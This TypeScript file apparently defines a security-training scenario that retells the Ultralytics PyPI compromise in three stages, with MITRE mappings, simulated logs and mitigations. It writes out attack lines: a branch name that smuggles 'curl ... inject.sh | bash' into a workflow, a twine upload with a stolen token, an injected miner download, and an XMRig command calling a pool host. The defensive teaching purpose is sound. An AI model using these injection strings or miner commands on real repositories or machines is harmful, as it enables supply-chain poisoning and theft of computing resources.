import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'pypi-ultralytics-github-pwnrequest',
    title: 'Ultralytics PyPI AI Package GitHub Actions PwnRequest & Token Compromise',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.001',
    description:
      'Attackers exploit a GitHub Actions pull_request_target script injection vulnerability in the Ultralytics YOLO AI framework repository to hijack the automated release pipeline and publish backdoored PyPI wheels (v8.3.41/42/45/46) bundling an XMRig cryptominer.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Crafted PR Branch ($GITHUB_ENV Injection)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'GitHub Actions (pull_request_target)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'PyPI Registry (ultralytics 8.3.41/45)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Sigstore / PyPI Attestation Auditor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'AI Training Cluster / Colab GPU Nodes', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: GitHub Actions pull_request_target Branch Name Command Injection',
        narration:
          'The attacker opens a pull request from a fork with a crafted branch name containing shell metacharacters. Because the repository workflow triggers on pull_request_target (which runs with write access and repository secrets) and interpolates ${{ github.head_ref }} directly into a run: shell block, arbitrary commands execute inside the privileged runner.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          'Crafted Branch Name: fix";curl -sSfL https://gist.githubusercontent.com/.../inject.sh | bash;#',
          'Vulnerable Workflow: on: pull_request_target -> run: echo "Branch: ${{ github.head_ref }}"',
        ],
        defenseMitigation:
          'Never interpolate untrusted context expressions (${{ github.head_ref }}, ${{ github.event.pull_request.title }}) directly inside run: scripts; pass them via environment variables and avoid pull_request_target for untrusted code.',
        logs: [
          {
            id: 'ultra-1',
            timestamp: '01:15:40.219',
            source: 'Auth',
            severity: 'critical',
            raw: 'GitHub Actions Workflow Execution | Trigger: pull_request_target | Workflow: format.yml | InjectedHeadRef: fix";curl -sSfL .../inject.sh | bash;# | Permissions: write-all + PYPI_TOKEN access',
            parsedFields: {
              VulnerabilityClass: 'GitHub Actions PwnRequest / Template Injection',
              TriggerContext: 'pull_request_target',
              UnsanitizedVariable: '${{ github.head_ref }}',
              TargetedProject: 'ultralytics/ultralytics',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Poisoning ultralytics/utils/downloads.py & Publishing PyPI v8.3.41–8.3.46',
        narration:
          'The injected payload poisons the build environment and steals the PyPI API token, publishing compromised versions 8.3.41, 8.3.42, 8.3.45, and 8.3.46 to PyPI with backdoored initialization code inside ultralytics/utils/downloads.py.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Persistence (T1195.001 - Compromise Software Dependencies)',
        technicalCommands: [
          'Inject into ultralytics/utils/downloads.py: safe_download("https://github.com/.../rig.tar.gz")',
          'twine upload dist/ultralytics-8.3.45-py3-none-any.whl -u __token__ -p $PYPI_TOKEN',
        ],
        defenseMitigation:
          'Enforce PyPI Trusted Publishing (OIDC with environment protection rules and manual approval gates) and audit Sigstore provenance attestations for every published wheel.',
        logs: [
          {
            id: 'ultra-2',
            timestamp: '02:04:11.650',
            source: 'WAF',
            severity: 'critical',
            raw: 'PyPI Transparency & Provenance Alert | Package: ultralytics | Versions: 8.3.41, 8.3.42, 8.3.45, 8.3.46 | Anomaly: Wheel contents in ultralytics/utils/downloads.py diverge from tagged Git source commit; versions 8.3.45/46 uploaded without OIDC Sigstore attestation',
            parsedFields: {
              CompromisedPackage: 'ultralytics (PyPI)',
              AffectedVersions: '8.3.41, 8.3.42, 8.3.45, 8.3.46',
              ModifiedFile: 'ultralytics/utils/downloads.py',
              ProvenanceSignal: 'Missing Sigstore OIDC Attestation on 8.3.45/8.3.46',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Downstream AI Workstation & Colab Execution of XMRig Miner (/tmp/ultralytics_runner)',
        narration:
          'When AI engineers or automated ML pipelines run pip install ultralytics and import the library, downloads.py fetches and executes /tmp/ultralytics_runner (XMRig) connecting to connect.consrensys.com:8080 and deletes the binary from disk while keeping it running in memory.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Impact (T1496 - Resource Hijacking)',
        technicalCommands: [
          'chmod +x /tmp/ultralytics_runner && /tmp/ultralytics_runner -u 4BHRQ... -o connect.consrensys.com:8080',
          'os.remove("/tmp/ultralytics_runner") (Unlinks binary from filesystem while process remains resident)',
        ],
        defenseMitigation:
          'Pin Python dependencies with cryptographic hashes (`pip install --require-hashes`) and monitor ML cluster nodes for unlinked binaries executing from /tmp.',
        logs: [
          {
            id: 'ultra-3',
            timestamp: '04:33:09.118',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'ultralytics_runner',
            CommandLine: '/tmp/ultralytics_runner -u 4BHRQ... -o connect.consrensys.com:8080',
            raw: 'Linux Runtime Alert | Process: /tmp/ultralytics_runner (deleted) | Parent: /usr/bin/python3 | NetworkConnection: connect.consrensys.com:8080 (Stratum Mining Protocol) | Note: Unlinked ELF executing from /tmp',
            parsedFields: {
              PayloadPath: '/tmp/ultralytics_runner (unlinked after start)',
              C2Pool: 'connect.consrensys.com:8080',
              PayloadFamily: 'XMRig Cryptominer',
            },
          },
        ],
        packets: [
          {
            id: 'ultra-pkt-1',
            timestamp: '04:33:09.400',
            protocol: 'TCP',
            sourceIp: '10.40.12.88',
            destIp: '198.51.100.210',
            port: 8080,
            flag: 'PSH-ACK',
            payloadSize: 256,
            hexDump: '7B 22 69 64 22 3A 31 2C 22 6A 73 6F 6E 72 70 63 22 3A 22 32 2E 30 22 2C 22 6D 65 74 68 6F 64 22 3A 22 6C 6F 67 69 6E 22 7D',
            decodedString: '{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"4BHRQ...","agent":"XMRig"}}',
          },
        ],
      },
    ],
  };
